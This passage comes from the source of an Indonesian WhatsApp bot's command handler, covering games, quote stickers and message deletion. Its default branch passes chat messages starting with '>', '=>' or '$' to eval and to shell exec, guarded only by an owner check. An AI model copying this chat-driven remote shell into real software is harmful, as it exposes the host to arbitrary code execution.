 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
 let TicTacToe = require("./lib/tictactoe.js")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await hupao.sendText(room.x, str, m, { mentions: parseMention(str) } )
await hupao.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await hupao.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) hupao.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
 //=================================================
case  'qcimg':{
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qcimg teks`)
const text = `${teks}`
const username = await hupao.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await hupao.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
hupao.sendMessage(from,{image: buffer},{quoted : hw})
})
}
break
//=================================================//
case  'qc':{
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await hupao.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await hupao.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await hupao.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
//=================================================
case 'delete':
case 'del': {
     if (groupMute) return 'error'
hupao.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break

//=================================================
default:
if (budy.startsWith('=>')) {
if (!isOwner) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return m.reply('*Khusus Owner*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isOwner) return m.reply('*Khusus Owner*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
hupao.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
